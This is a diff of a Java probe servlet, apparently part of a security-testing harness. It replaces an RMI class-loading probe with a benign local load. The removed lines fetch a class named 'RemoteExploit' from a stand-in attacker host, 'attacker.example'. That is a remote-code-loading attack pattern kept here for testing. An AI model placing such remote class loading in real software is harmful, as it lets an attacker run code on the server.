@@ -184,12 +184,12 @@ public final class Java11ProbeServlet extends HttpServlet {
     }
     if ("/java11/rmi-classloader".equals(path)) {
       try {
-        RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
-      } catch (ClassNotFoundException expected) {
-        send(response, "java11 rmi classloader attempted");
-        return;
+        Class<?> type = RMIClassLoader.loadClass(
+            "https://reports.invalid/catalog/", "java.lang.String", Java11ProbeServlet.class.getClassLoader());
+        send(response, "local-rmi-class=" + type.getName());
+      } catch (ClassNotFoundException e) {
+        throw new ServletException(e);
       }
-      send(response, "java11 rmi classloader completed");
       return;
     }
     if ("/java11/jdbc-h2".equals(path)) {
